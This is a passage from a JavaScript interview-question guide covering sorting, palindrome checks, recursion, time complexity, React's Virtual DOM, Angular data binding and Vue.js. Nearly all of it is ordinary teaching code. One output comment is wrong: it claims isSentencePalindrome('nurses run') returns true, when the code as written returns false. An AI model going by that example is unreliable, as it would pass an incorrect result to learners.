// [1, 3, 5, 7, null, null, undefined]
```

**Stable Sorting (Maintain Relative Order):**

```javascript
// Array.sort() is stable in modern browsers (ES2019+)
const items = [
  { name: 'A', priority: 1 },
  { name: 'B', priority: 2 },
  { name: 'C', priority: 1 }
];

items.sort((a, b) => a.priority - b.priority);
// Items with same priority maintain their original order
```

### Performance Comparison

| Algorithm | Best | Average | Worst | Space | Stable |
|-----------|------|---------|-------|-------|--------|
| Array.sort() | O(n log n) | O(n log n) | O(n log n) | O(log n) | Yes |
| Bubble Sort | O(n) | O(n²) | O(n²) | O(1) | Yes |
| Quick Sort | O(n log n) | O(n log n) | O(n²) | O(log n) | No |
| Merge Sort | O(n log n) | O(n log n) | O(n log n) | O(n) | Yes |
| Selection Sort | O(n²) | O(n²) | O(n²) | O(1) | No |

**Recommendation:** Use built-in `Array.sort()` for most cases as it's optimized and uses Timsort (hybrid of merge sort and insertion sort) in most modern browsers.

## 68. How do you check if a string is a palindrome?

A **palindrome** is a string that reads the same forwards and backwards, ignoring spaces, punctuation, and case.

### Simple Palindrome Check

**Basic Method (Case-Sensitive, No Spaces):**

```javascript
function isPalindrome(str) {
  const reversed = str.split('').reverse().join('');
  return str === reversed;
}

console.log(isPalindrome('racecar')); // true
console.log(isPalindrome('hello')); // false
console.log(isPalindrome('madam')); // true
```

**Two-Pointer Approach (More Efficient):**

```javascript
function isPalindrome(str) {
  let left = 0;
  let right = str.length - 1;
  
  while (left < right) {
    if (str[left] !== str[right]) {
      return false;
    }
    left++;
    right--;
  }
  
  return true;
}

console.log(isPalindrome('noon')); // true
console.log(isPalindrome('world')); // false
```

### Advanced Palindrome Checks

**Case-Insensitive with Space/Punctuation Removal:**

```javascript
function isPalindrome(str) {
  // Remove non-alphanumeric characters and convert to lowercase
  const cleaned = str.toLowerCase().replace(/[^a-z0-9]/g, '');
  
  // Compare with reversed version
  const reversed = cleaned.split('').reverse().join('');
  return cleaned === reversed;
}

console.log(isPalindrome('A man, a plan, a canal: Panama')); // true
console.log(isPalindrome('race a car')); // false
console.log(isPalindrome("Madam, I'm Adam")); // true
console.log(isPalindrome('Was it a car or a cat I saw?')); // true
```

**Two-Pointer with Cleaning (More Memory Efficient):**

```javascript
function isPalindrome(str) {
  const cleaned = str.toLowerCase().replace(/[^a-z0-9]/g, '');
  let left = 0;
  let right = cleaned.length - 1;
  
  while (left < right) {
    if (cleaned[left] !== cleaned[right]) {
      return false;
    }
    left++;
    right--;
  }
  
  return true;
}
```

**Without Creating New String (Most Efficient):**

```javascript
function isPalindrome(str) {
  let left = 0;
  let right = str.length - 1;
  
  while (left < right) {
    // Skip non-alphanumeric characters from left
    while (left < right && !isAlphanumeric(str[left])) {
      left++;
    }
    
    // Skip non-alphanumeric characters from right
    while (left < right && !isAlphanumeric(str[right])) {
      right--;
    }
    
    // Compare characters (case-insensitive)
    if (str[left].toLowerCase() !== str[right].toLowerCase()) {
      return false;
    }
    
    left++;
    right--;
  }
  
  return true;
}

function isAlphanumeric(char) {
  const code = char.charCodeAt(0);
  return (code >= 48 && code <= 57) || // 0-9
         (code >= 65 && code <= 90) || // A-Z
         (code >= 97 && code <= 122);  // a-z
}

console.log(isPalindrome('A man, a plan, a canal: Panama')); // true
```

### Using Array Methods

**With every() Method:**

```javascript
function isPalindrome(str) {
  const cleaned = str.toLowerCase().replace(/[^a-z0-9]/g, '');
  const arr = cleaned.split('');
  
  return arr.every((char, index) => {
    return char === arr[arr.length - 1 - index];
  });
}
```

**Recursive Approach:**

```javascript
function isPalindrome(str) {
  const cleaned = str.toLowerCase().replace(/[^a-z0-9]/g, '');
  
  function checkPalindrome(s) {
    if (s.length <= 1) return true;
    if (s[0] !== s[s.length - 1]) return false;
    return checkPalindrome(s.slice(1, -1));
  }
  
  return checkPalindrome(cleaned);
}

console.log(isPalindrome('racecar')); // true
```

### Enhanced Palindrome Checker Class

```javascript
class PalindromeChecker {
  constructor(options = {}) {
    this.caseSensitive = options.caseSensitive || false;
    this.ignoreSpaces = options.ignoreSpaces !== false;
    this.ignorePunctuation = options.ignorePunctuation !== false;
  }

  clean(str) {
    let cleaned = str;
    
    if (!this.caseSensitive) {
      cleaned = cleaned.toLowerCase();
    }
    
    if (this.ignorePunctuation) {
      cleaned = cleaned.replace(/[^a-zA-Z0-9\s]/g, '');
    }
    
    if (this.ignoreSpaces) {
      cleaned = cleaned.replace(/\s/g, '');
    }
    
    return cleaned;
  }

  check(str) {
    const cleaned = this.clean(str);
    let left = 0;
    let right = cleaned.length - 1;
    
    while (left < right) {
      if (cleaned[left] !== cleaned[right]) {
        return false;
      }
      left++;
      right--;
    }
    
    return true;
  }

  findLongestPalindrome(str) {
    let longest = '';
    
    for (let i = 0; i < str.length; i++) {
      for (let j = i + 1; j <= str.length; j++) {
        const substring = str.slice(i, j);
        if (this.check(substring) && substring.length > longest.length) {
          longest = substring;
        }
      }
    }
    
    return longest;
  }
}

// Usage
const checker = new PalindromeChecker({
  caseSensitive: false,
  ignoreSpaces: true,
  ignorePunctuation: true
});

console.log(checker.check('A man, a plan, a canal: Panama')); // true
console.log(checker.findLongestPalindrome('babad')); // 'bab' or 'aba'
```

### Special Cases

**Number Palindrome:**

```javascript
function isNumberPalindrome(num) {
  const str = num.toString();
  return str === str.split('').reverse().join('');
}

console.log(isNumberPalindrome(121)); // true
console.log(isNumberPalindrome(12321)); // true
console.log(isNumberPalindrome(123)); // false
```

**Palindrome Sentence (Preserve Spaces):**

```javascript
function isSentencePalindrome(str) {
  const cleaned = str.toLowerCase().replace(/[^a-z\s]/g, '');
  return cleaned === cleaned.split('').reverse().join('');
}

console.log(isSentencePalindrome('nurses run')); // true
```

### Performance Comparison

| Method | Time Complexity | Space Complexity | Notes |
|--------|----------------|------------------|-------|
| Reverse & Compare | O(n) | O(n) | Simple but uses extra space |
| Two Pointers | O(n) | O(1) | Most efficient |
| Recursive | O(n) | O(n) | Uses call stack |
| every() Method | O(n) | O(n) | Functional but slower |

## 69. Describe a recursive function and provide an example.

A **recursive function** is a function that calls itself to solve a problem by breaking it down into smaller, similar subproblems. Every recursive function needs a base case (stopping condition) and a recursive case (where the function calls itself).

### Anatomy of Recursion

**Key Components:**

1. **Base Case:** Condition where recursion stops
2. **Recursive Case:** Function calls itself with modified parameters
3. **Progress:** Each call moves closer to the base case

### Basic Examples

**Factorial Calculation:**

```javascript
function factorial(n) {
  // Base case: factorial of 0 or 1 is 1
  if (n <= 1) {
    return 1;
  }
  
  // Recursive case: n! = n × (n-1)!
  return n * factorial(n - 1);
}

console.log(factorial(5)); // 120 (5 × 4 × 3 × 2 × 1)
console.log(factorial(0)); // 1

// How it works:
// factorial(5) = 5 * factorial(4)
//              = 5 * 4 * factorial(3)
//              = 5 * 4 * 3 * factorial(2)
//              = 5 * 4 * 3 * 2 * factorial(1)
//              = 5 * 4 * 3 * 2 * 1
//              = 120
```

**Fibonacci Sequence:**

```javascript
function fibonacci(n) {
  // Base cases
  if (n <= 0) return 0;
  if (n === 1) return 1;
  
  // Recursive case: fib(n) = fib(n-1) + fib(n-2)
  return fibonacci(n - 1) + fibonacci(n - 2);
}

console.log(fibonacci(6)); // 8
// Sequence: 0, 1, 1, 2, 3, 5, 8, 13...

// Call tree for fibonacci(5):
//                 fib(5)
//              /          \
//          fib(4)          fib(3)
//         /     \         /     \
//     fib(3)   fib(2)  fib(2)  fib(1)
//     /   \    /   \   /   \
// fib(2) fib(1)...
```

**Optimized Fibonacci with Memoization:**

```javascript
function fibonacci(n, memo = {}) {
  // Check memo first
  if (n in memo) return memo[n];
  
  // Base cases
  if (n <= 0) return 0;
  if (n === 1) return 1;
  
  // Calculate and store in memo
  memo[n] = fibonacci(n - 1, memo) + fibonacci(n - 2, memo);
  return memo[n];
}

console.log(fibonacci(50)); // Fast! Without memo this would take forever
```

### Common Recursive Patterns

**Sum of Array:**

```javascript
function sumArray(arr) {
  // Base case: empty array
  if (arr.length === 0) {
    return 0;
  }
  
  // Recursive case: first element + sum of rest
  return arr[0] + sumArray(arr.slice(1));
}

console.log(sumArray([1, 2, 3, 4, 5])); // 15
```

**Reverse String:**

```javascript
function reverseString(str) {
  // Base case: empty or single character
  if (str.length <= 1) {
    return str;
  }
  
  // Recursive case: last char + reverse of remaining
  return str[str.length - 1] + reverseString(str.slice(0, -1));
}

console.log(reverseString('hello')); // 'olleh'
```

**Count Down:**

```javascript
function countdown(n) {
  // Base case
  if (n <= 0) {
    console.log('Blastoff!');
    return;
  }
  
  // Recursive case
  console.log(n);
  countdown(n - 1);
}

countdown(5);
// Output: 5, 4, 3, 2, 1, Blastoff!
```

### Advanced Recursive Examples

**Power Function:**

```javascript
function power(base, exponent) {
  // Base case
  if (exponent === 0) {
    return 1;
  }
  
  // Recursive case
  return base * power(base, exponent - 1);
}

console.log(power(2, 5)); // 32

// Optimized using divide and conquer
function powerOptimized(base, exponent) {
  if (exponent === 0) return 1;
  
  const half = powerOptimized(base, Math.floor(exponent / 2));
  
  if (exponent % 2 === 0) {
    return half * half;
  } else {
    return base * half * half;
  }
}
```

**Flatten Nested Array:**

```javascript
function flatten(arr) {
  let result = [];
  
  for (let item of arr) {
    if (Array.isArray(item)) {
      // Recursive case: flatten nested array
      result = result.concat(flatten(item));
    } else {
      // Base case: add non-array item
      result.push(item);
    }
  }
  
  return result;
}

console.log(flatten([1, [2, [3, 4], 5], 6])); // [1, 2, 3, 4, 5, 6]
console.log(flatten([[1, 2], [3, [4, [5]]]])); // [1, 2, 3, 4, 5]
```

**Deep Clone Object:**

```javascript
function deepClone(obj) {
  // Base cases
  if (obj === null || typeof obj !== 'object') {
    return obj;
  }
  
  if (obj instanceof Date) {
    return new Date(obj.getTime());
  }
  
  if (obj instanceof Array) {
    return obj.map(item => deepClone(item));
  }
  
  // Recursive case for objects
  const clonedObj = {};
  for (let key in obj) {
    if (obj.hasOwnProperty(key)) {
      clonedObj[key] = deepClone(obj[key]);
    }
  }
  
  return clonedObj;
}

const original = {
  name: 'John',
  address: {
    city: 'New York',
    zip: 10001
  },
  hobbies: ['reading', 'coding']
};

const copy = deepClone(original);
copy.address.city = 'Boston';
console.log(original.address.city); // 'New York' - unchanged
```

**Binary Search (Recursive):**

```javascript
function binarySearch(arr, target, left = 0, right = arr.length - 1) {
  // Base case: element not found
  if (left > right) {
    return -1;
  }
  
  const mid = Math.floor((left + right) / 2);
  
  // Base case: element found
  if (arr[mid] === target) {
    return mid;
  }
  
  // Recursive cases
  if (arr[mid] > target) {
    return binarySearch(arr, target, left, mid - 1);
  } else {
    return binarySearch(arr, target, mid + 1, right);
  }
}

const sorted = [1, 3, 5, 7, 9, 11, 13, 15];
console.log(binarySearch(sorted, 7)); // 3 (index)
console.log(binarySearch(sorted, 8)); // -1 (not found)
```

**Tree Traversal:**

```javascript
class TreeNode {
  constructor(value) {
    this.value = value;
    this.left = null;
    this.right = null;
  }
}

// Inorder traversal (Left, Root, Right)
function inorderTraversal(node, result = []) {
  if (node === null) {
    return result;
  }
  
  inorderTraversal(node.left, result);
  result.push(node.value);
  inorderTraversal(node.right, result);
  
  return result;
}

// Create a binary tree
const root = new TreeNode(4);
root.left = new TreeNode(2);
root.right = new TreeNode(6);
root.left.left = new TreeNode(1);
root.left.right = new TreeNode(3);

console.log(inorderTraversal(root)); // [1, 2, 3, 4, 6]
```

**Calculate Sum of Nested Object Values:**

```javascript
function sumNestedValues(obj) {
  let sum = 0;
  
  for (let key in obj) {
    if (typeof obj[key] === 'number') {
      sum += obj[key];
    } else if (typeof obj[key] === 'object' && obj[key] !== null) {
      sum += sumNestedValues(obj[key]);
    }
  }
  
  return sum;
}

const data = {
  a: 10,
  b: {
    c: 20,
    d: {
      e: 30,
      f: 40
    }
  },
  g: 50
};

console.log(sumNestedValues(data)); // 150
```

**Generate All Permutations:**

```javascript
function permutations(str) {
  // Base case: single character
  if (str.length <= 1) {
    return [str];
  }
  
  const result = [];
  
  // For each character
  for (let i = 0; i < str.length; i++) {
    const char = str[i];
    const remaining = str.slice(0, i) + str.slice(i + 1);
    
    // Get permutations of remaining characters
    const remainingPerms = permutations(remaining);
    
    // Add current character to each permutation
    for (let perm of remainingPerms) {
      result.push(char + perm);
    }
  }
  
  return result;
}

console.log(permutations('abc'));
// ['abc', 'acb', 'bac', 'bca', 'cab', 'cba']
```

**Path Sum in Binary Tree:**

```javascript
function hasPathSum(node, targetSum, currentSum = 0) {
  // Base case: null node
  if (node === null) {
    return false;
  }
  
  currentSum += node.value;
  
  // Base case: leaf node
  if (node.left === null && node.right === null) {
    return currentSum === targetSum;
  }
  
  // Recursive case: check left or right subtree
  return hasPathSum(node.left, targetSum, currentSum) ||
         hasPathSum(node.right, targetSum, currentSum);
}
```

### Recursion vs Iteration

**Recursive Approach:**
```javascript
function sumToN(n) {
  if (n <= 1) return n;
  return n + sumToN(n - 1);
}
```

**Iterative Approach:**
```javascript
function sumToN(n) {
  let sum = 0;
  for (let i = 1; i <= n; i++) {
    sum += i;
  }
  return sum;
}
```

### Tail Recursion (Optimization)

**Regular Recursion (Not Tail Recursive):**
```javascript
function factorial(n) {
  if (n <= 1) return 1;
  return n * factorial(n - 1); // Operation after recursive call
}
```

**Tail Recursive Version:**
```javascript
function factorial(n, accumulator = 1) {
  if (n <= 1) return accumulator;
  return factorial(n - 1, n * accumulator); // Recursive call is last operation
}

console.log(factorial(5)); // 120
```

### Advantages and Disadvantages

**Advantages:**
- Elegant and intuitive for certain problems (trees, mathematical sequences)
- Reduces code complexity for problems with recursive nature
- Natural fit for divide-and-conquer algorithms
- Makes code more readable for complex problems

**Disadvantages:**
- Can cause stack overflow for deep recursion
- Generally slower than iteration due to function call overhead
- Uses more memory (call stack)
- Can be harder to debug

### When to Use Recursion

**Good Use Cases:**
- Tree/graph traversal
- Divide and conquer algorithms
- Backtracking problems
- Mathematical sequences
- Nested data structures

**Avoid Recursion For:**
- Simple loops that can be done iteratively
- Very deep recursion (risk of stack overflow)
- Performance-critical code
- Problems without clear recursive structure

## 70. What is the time complexity of JavaScript operations?

**Time complexity** describes how the runtime of an operation grows as the input size increases. Understanding time complexity helps write efficient code.

### Big O Notation

Common time complexities from fastest to slowest:

- **O(1)** - Constant: Same time regardless of input size
- **O(log n)** - Logarithmic: Doubles input, adds one operation
- **O(n)** - Linear: Time grows proportionally with input
- **O(n log n)** - Linearithmic: Efficient sorting algorithms
- **O(n²)** - Quadratic: Nested loops over input
- **O(2ⁿ)** - Exponential: Doubles with each added input
- **O(n!)** - Factorial: Extremely slow, permutations

### Array Operations

**Access by Index: O(1)**
```javascript
const arr = [1, 2, 3, 4, 5];
console.log(arr[2]); // O(1) - direct access
```

**Push (add to end): O(1)**
```javascript
arr.push(6); // O(1) - add to end
```

**Pop (remove from end): O(1)**
```javascript
arr.pop(); // O(1) - remove from end
```

**Shift (remove from start): O(n)**
```javascript
arr.shift(); // O(n) - must re-index all elements
```

**Unshift (add to start): O(n)**
```javascript
arr.unshift(0); // O(n) - must re-index all elements
```

**Splice: O(n)**
```javascript
arr.splice(2, 1); // O(n) - must shift elements
```

**Slice: O(n)**
```javascript
const copy = arr.slice(); // O(n) - creates new array
```

**indexOf/includes: O(n)**
```javascript
arr.indexOf(3); // O(n) - linear search
arr.includes(3); // O(n) - linear search
```

**forEach/map/filter/reduce: O(n)**
```javascript
arr.forEach(x => console.log(x)); // O(n) - iterate once
arr.map(x => x * 2); // O(n)
arr.filter(x => x > 2); // O(n)
arr.reduce((sum, x) => sum + x, 0); // O(n)
```

**sort: O(n log n)**
```javascript
arr.sort((a, b) => a - b); // O(n log n) - efficient sort
```

**reverse: O(n)**
```javascript
arr.reverse(); // O(n) - must swap n/2 pairs
```

**concat: O(n + m)**
```javascript
const combined = arr1.concat(arr2); // O(n + m) where n, m are lengths
```

**find/findIndex: O(n)**
```javascript
arr.find(x => x > 3); // O(n) - worst case checks all
```

**every/some: O(n)**
```javascript
arr.every(x => x > 0); // O(n) - worst case
arr.some(x => x > 3); // O(n) - worst case
```

### Object Operations

**Property Access: O(1)**
```javascript
const obj = { name: 'John', age: 30 };
console.log(obj.name); // O(1) - hash table lookup
console.log(obj['age']); // O(1)
```

**Property Assignment: O(1)**
```javascript
obj.city = 'New York'; // O(1)
```

**Property Deletion: O(1)**
```javascript
delete obj.age; // O(1)
```

**Object.keys/values/entries: O(n)**
```javascript
Object.keys(obj); // O(n) - iterate all properties
Object.values(obj); // O(n)
Object.entries(obj); // O(n)
```

**hasOwnProperty/in operator: O(1)**
```javascript
obj.hasOwnProperty('name'); // O(1)
'name' in obj; // O(1)
```

**Object.assign: O(n)**
```javascript
Object.assign({}, obj); // O(n) - copy all properties
```

### String Operations

**Access by Index: O(1)**
```javascript
const str = 'hello';
console.log(str[0]); // O(1)
```

**length: O(1)**
```javascript
console.log(str.length); // O(1) - stored property
```

**concat/+: O(n + m)**
```javascript
const result = str1 + str2; // O(n + m)
```

**slice/substring: O(n)**
```javascript
str.slice(0, 3); // O(n) - creates new string
```

**indexOf/includes: O(n * m)**
```javascript
str.indexOf('ll'); // O(n * m) - worst case
```

**split: O(n)**
```javascript
str.split(''); // O(n)
```

**replace: O(n)**
```javascript
str.replace('e', 'a'); // O(n)
```

**toLowerCase/toUpperCase: O(n)**
```javascript
str.toLowerCase(); // O(n)
```

**trim: O(n)**
```javascript
str.trim(); // O(n)
```

**charAt/charCodeAt: O(1)**
```javascript
str.charAt(2); // O(1)
```

### Set Operations

**add: O(1)**
```javascript
const set = new Set();
set.add(1); // O(1) - hash table
```

**delete: O(1)**
```javascript
set.delete(1); // O(1)
```

**has: O(1)**
```javascript
set.has(1); // O(1)
```

**size: O(1)**
```javascript
console.log(set.size); // O(1)
```

**clear: O(1)**
```javascript
set.clear(); // O(1)
```

**Iteration (forEach, for...of): O(n)**
```javascript
set.forEach(item => console.log(item)); // O(n)
```

### Map Operations

**set: O(1)**
```javascript
const map = new Map();
map.set('key', 'value'); // O(1)
```

**get: O(1)**
```javascript
map.get('key'); // O(1)
```

**delete: O(1)**
```javascript
map.delete('key'); // O(1)
```

**has: O(1)**
```javascript
map.has('key'); // O(1)
```

**size: O(1)**
```javascript
console.log(map.size); // O(1)
```

**clear: O(1)**
```javascript
map.clear(); // O(1)
```

**Iteration: O(n)**
```javascript
map.forEach((value, key) => console.log(key, value)); // O(n)
```

### Common Algorithm Complexities

**Linear Search: O(n)**
```javascript
function linearSearch(arr, target) {
  for (let i = 0; i < arr.length; i++) {
    if (arr[i] === target) return i;
  }
  return -1;
}
```

**Binary Search: O(log n)**
```javascript
function binarySearch(arr, target) {
  let left = 0, right = arr.length - 1;
  
  while (left <= right) {
    const mid = Math.floor((left + right) / 2);
    if (arr[mid] === target) return mid;
    if (arr[mid] < target) left = mid + 1;
    else right = mid - 1;
  }
  return -1;
}
```

**Bubble Sort: O(n²)**
```javascript
function bubbleSort(arr) {
  for (let i = 0; i < arr.length; i++) {
    for (let j = 0; j < arr.length - i - 1; j++) {
      if (arr[j] > arr[j + 1]) {
        [arr[j], arr[j + 1]] = [arr[j + 1], arr[j]];
      }
    }
  }
  return arr;
}
```

**Quick Sort: O(n log n) average, O(n²) worst**
```javascript
function quickSort(arr) {
  if (arr.length <= 1) return arr;
  
  const pivot = arr[Math.floor(arr.length / 2)];
  const left = arr.filter(x => x < pivot);
  const middle = arr.filter(x => x === pivot);
  const right = arr.filter(x => x > pivot);
  
  return [...quickSort(left), ...middle, ...quickSort(right)];
}
```

**Merge Sort: O(n log n)**
```javascript
function mergeSort(arr) {
  if (arr.length <= 1) return arr;
  
  const mid = Math.floor(arr.length / 2);
  const left = mergeSort(arr.slice(0, mid));
  const right = mergeSort(arr.slice(mid));
  
  return merge(left, right);
}
```

### Nested Loops Complexity

**Single Loop: O(n)**
```javascript
for (let i = 0; i < n; i++) {
  // O(1) operation
}
```

**Nested Loops: O(n²)**
```javascript
for (let i = 0; i < n; i++) {
  for (let j = 0; j < n; j++) {
    // O(1) operation
  }
}
```

**Triple Nested: O(n³)**
```javascript
for (let i = 0; i < n; i++) {
  for (let j = 0; j < n; j++) {
    for (let k = 0; k < n; k++) {
      // O(1) operation
    }
  }
}
```

**Dependent Loops: O(n²)**
```javascript
for (let i = 0; i < n; i++) {
  for (let j = i; j < n; j++) {
    // Still O(n²) overall
  }
}
```

### Space Complexity

Understanding space complexity is also important:

- **O(1)** - Constant space (few variables)
- **O(n)** - Linear space (array/object of size n)
- **O(n²)** - Quadratic space (2D array)

**Examples:**

```javascript
// O(1) space - only a few variables
function sum(arr) {
  let total = 0;
  for (let num of arr) {
    total += num;
  }
  return total;
}

// O(n) space - creates new array
function double(arr) {
  return arr.map(x => x * 2);
}

// O(n) space - recursive call stack
function factorial(n) {
  if (n <= 1) return 1;
  return n * factorial(n - 1);
}
```

### Performance Tips

**Use appropriate data structures:**
- Need fast lookups? Use Map or Set (O(1)) instead of Array (O(n))
- Need ordered data? Use Array
- Need key-value pairs? Use Map instead of Object for better performance

**Avoid unnecessary operations:**
```javascript
// Bad: O(n²)
for (let i = 0; i < arr.length; i++) {
  arr.indexOf(arr[i]); // O(n) inside O(n) loop
}

// Good: O(n)
const set = new Set(arr);
for (let item of arr) {
  set.has(item); // O(1) inside O(n) loop
}
```

**Cache length in loops:**
```javascript
// Slightly better
const len = arr.length;
for (let i = 0; i < len; i++) {
  // operations
}
```

Remember: Optimize for readability first, then for performance when needed!




# JavaScript Libraries and Frameworks (71-75)



## 71. What is the difference between a library and a framework in JavaScript?

The key difference between a library and a framework lies in the concept of "Inversion of Control" (IoC):

**Library:**
A library is a collection of reusable functions and utilities that you call when you need them. You are in control of the application flow and decide when and where to use the library's features.

- **Control Flow:** You control the flow - you call the library
- **Flexibility:** Use only what you need, when you need it
- **Examples:** Lodash, Axios, jQuery, Moment.js
- **Integration:** Easy to integrate into existing projects
- **Learning Curve:** Generally smaller and focused

```javascript
// Using a library (Axios) - you call it when needed
import axios from 'axios';

function fetchData() {
  axios.get('/api/data')
    .then(response => console.log(response.data));
}
```

**Framework:**
A framework provides a complete structure and architecture for building applications. It calls your code and dictates the overall flow of the application. You fill in the specific pieces according to the framework's rules.

- **Control Flow:** The framework controls the flow - it calls your code
- **Structure:** Provides a complete architectural pattern
- **Examples:** Angular, Vue.js, Next.js, Express.js
- **Integration:** Often requires building the entire app around it
- **Learning Curve:** Typically steeper with more concepts to learn

```javascript
// Using a framework (React) - it controls when your code runs
import React from 'react';

function MyComponent() {
  // Framework calls this when it needs to render
  return <div>Hello World</div>;
}
```

**Key Analogy:**
- **Library:** Like using a toolbox - you pick the tools you need
- **Framework:** Like building a house with a blueprint - you follow the structure and fill in the details



## 72. Explain the Virtual DOM in React.

The Virtual DOM is a lightweight JavaScript representation of the actual DOM that React uses to optimize UI updates and improve performance.

**How It Works:**

1. **Initial Render:**
   - React creates a virtual DOM tree (a JavaScript object) that mirrors the actual DOM
   - This virtual tree is rendered to the real DOM

2. **State/Props Change:**
   - When data changes, React creates a new virtual DOM tree
   - The old virtual DOM is kept in memory for comparison

3. **Diffing Algorithm:**
   - React compares the new virtual DOM with the previous snapshot
   - It identifies exactly what changed (this process is called "reconciliation")
   - Only the differences are calculated

4. **Batch Updates:**
   - React batches multiple changes together
   - Updates are applied to the real DOM in the most efficient way possible
   - Only the changed elements are updated, not the entire DOM

**Benefits:**

- **Performance:** Minimizes expensive DOM manipulations by batching updates
- **Efficiency:** Only updates what actually changed, not the entire page
- **Predictability:** Declarative code makes UI updates predictable
- **Cross-platform:** Enables React Native by abstracting the rendering target

**Example:**

```javascript
// When state changes from count=5 to count=6
function Counter() {
  const [count, setCount] = useState(5);
  
  return (
    <div>
      <h1>Count: {count}</h1>
      <button onClick={() => setCount(count + 1)}>Increment</button>
    </div>
  );
}

// Virtual DOM process:
// 1. New virtual DOM created with count=6
// 2. React diffs: only <h1> text changed from "Count: 5" to "Count: 6"
// 3. React updates only that text node in the real DOM
```

**Reconciliation Strategy:**

React uses heuristics to make diffing O(n) instead of O(n³):
- Elements of different types produce different trees
- Keys help identify which items have changed, been added, or removed
- Component updates are handled hierarchically



## 73. How does data binding work in Angular?

Angular uses a sophisticated data binding system that synchronizes data between the component class (TypeScript) and the view (HTML template). Angular supports several types of data binding:

**1. Interpolation (One-Way: Component → View)**

Displays component data in the template using double curly braces.

```typescript
// Component
export class AppComponent {
  title = 'My App';
  count = 42;
}
```

```html
<!-- Template -->
<h1>{{ title }}</h1>
<p>Count: {{ count }}</p>
```

**2. Property Binding (One-Way: Component → View)**

Sets element properties dynamically using square brackets.

```typescript
// Component
export class AppComponent {
  imageUrl = 'assets/logo.png';
  isDisabled = false;
}
```

```html
<!-- Template -->
<img [src]="imageUrl">
<button [disabled]="isDisabled">Click Me</button>
```

**3. Event Binding (One-Way: View → Component)**

Listens to DOM events using parentheses.

```typescript
// Component
export class AppComponent {
  handleClick() {
    console.log('Button clicked!');
  }
  
  handleInput(event: Event) {
    console.log((event.target as HTMLInputElement).value);
  }
}
```

```html
<!-- Template -->
<button (click)="handleClick()">Click Me</button>
<input (input)="handleInput($event)">
```

**4. Two-Way Binding (Component ↔ View)**

Combines property and event binding using the "banana in a box" syntax `[()]`. Commonly used with `ngModel` for form inputs.

```typescript
// Component
import { FormsModule } from '@angular/forms';

export class AppComponent {
  username = '';
  email = '';
}
```

```html
<!-- Template -->
<input [(ngModel)]="username" placeholder="Username">
<input [(ngModel)]="email" placeholder="Email">
<p>Hello, {{ username }}!</p>
```

**How It Works Internally:**

Angular uses **Zone.js** to detect changes:

1. **Change Detection:** Angular monitors application state for changes
2. **Zone.js:** Patches asynchronous APIs (setTimeout, HTTP requests, events) to know when to check for updates
3. **Digest Cycle:** When changes occur, Angular runs change detection from the root component down the tree
4. **Update View:** Changed values are reflected in the DOM

**Change Detection Strategies:**

```typescript
// Default: checks component and children on every change
@Component({
  changeDetection: ChangeDetectionStrategy.Default
})

// OnPush: checks only when input references change or events fire
@Component({
  changeDetection: ChangeDetectionStrategy.OnPush
})
```

**Example of Complete Data Flow:**

```typescript
import { Component } from '@angular/core';

@Component({
  selector: 'app-user-form',
  template: `
    <div>
      <input [(ngModel)]="username" placeholder="Enter name">
      <button (click)="greet()">Greet</button>
      <p>{{ message }}</p>
    </div>
  `
})
export class UserFormComponent {
  username = '';
  message = '';
  
  greet() {
    this.message = `Hello, ${this.username}!`;
  }
}

// Flow:
// 1. User types in input → ngModel updates username property
// 2. username property updates → input value updates (two-way)
// 3. User clicks button → greet() method executes
// 4. message property changes → interpolation updates the <p> element
```

## 74. What is Vue.js and what sets it apart from other frameworks?

Vue.js is a progressive JavaScript framework for building user interfaces and single-page applications. Created by Evan You in 2014, Vue focuses on the view layer and is designed to be incrementally adoptable.

**Core Features:**

- **Reactive Data Binding:** Automatic synchronization between data and the DOM
- **Component-Based Architecture:** Reusable, self-contained UI components
- **Virtual DOM:** Efficient rendering and updates
- **Directives:** Special attributes like `v-if`, `v-for`, `v-model` for template logic
- **Single File Components:** HTML, CSS, and JavaScript in one `.vue` file

**What Sets Vue Apart:**

**1. Progressive Framework**
Vue can be used as a simple library or scaled up to a full-featured framework. You can:
- Drop it into a page with a `<script>` tag for simple features
- Build a complete SPA with routing, state management, and build tools

```html
<!-- Simple Vue usage -->
<div id="app">{{ message }}</div>

<script src="https://cdn.jsdelivr.net/npm/vue@3"></script>
<script>
  Vue.createApp({
    data() {
      return { message: 'Hello Vue!' }
    }
  }).mount('#app');
</script>
```

**2. Gentle Learning Curve**
Vue has the most approachable syntax compared to React and Angular:
- HTML-based templates (familiar to web developers)
- Clear separation of concerns
- Excellent documentation
- Less boilerplate code

**3. Single File Components (SFC)**
Everything for a component in one file:

```vue
<template>
  <div class="counter">
    <h2>{{ count }}</h2>
    <button @click="increment">Increment</button>
  </div>
</template>

<script>
export default {
  data() {
    return {
      count: 0
    }
  },
  methods: {
    increment() {
      this.count++;
    }
  }
}
</script>

<style scoped>
.counter {
  text-align: center;
  padding: 20px;
}
</style>
```

**4. Reactivity System**
Vue 3 uses the Proxy-based reactivity system for automatic dependency tracking:

```javascript
import { ref, computed } from 'vue';

// Reactive data
const count = ref(0);
const doubled = computed(() => count.value * 2);

// Changes automatically update the DOM
count.value++; // doubled automatically becomes 2
```

**5. Two-Way Data Binding**
Built-in `v-model` directive for seamless form handling:

```vue
<template>
  <input v-model="username" placeholder="Enter name">
  <p>Hello, {{ username }}!</p>
</template>
```

**6. Flexible and Lightweight**
- Small bundle size (~33KB min+gzip for Vue 3 runtime)
- No opinionated structure for small projects
- Optional official libraries (Vue Router, Pinia) for larger apps

**7. Composition API (Vue 3)**
More flexible code organization for complex components:

```javascript
import { ref, onMounted } from 'vue';

export default {
  setup() {
    const users = ref([]);
    const loading = ref(false);
    
    const fetchUsers = async () => {
      loading.value = true;
      const response = await fetch('/api/users');
      users.value = await response.json();
      loading.value = false;
    };
    
    onMounted(fetchUsers);
    
    return { users, loading, fetchUsers };
  }
}
```

**Comparison with Other Frameworks:**

| Feature | Vue | React | Angular |
|---------|-----|-------|---------|
| Learning Curve | Easy | Moderate | Steep |
| Size | Small (~33KB) | Medium (~42KB) | Large (~167KB) |
| Template Syntax | HTML-based | JSX | HTML-based + TypeScript |
| Two-Way Binding | Built-in | Manual | Built-in |
| State Management | Pinia (optional) | Redux/Context | RxJS/Services |
| TypeScript | Optional | Optional | Required |
| Company Backing | Community | Meta | Google |

**When to Choose Vue:**

- Building projects of any size, from simple to complex
- Want an easy learning curve with powerful features
- Need flexibility in project structure
- Prefer HTML-based templates over JSX
- Want built-in solutions without heavy configuration



## 75. Can you describe the jQuery library and its applications?

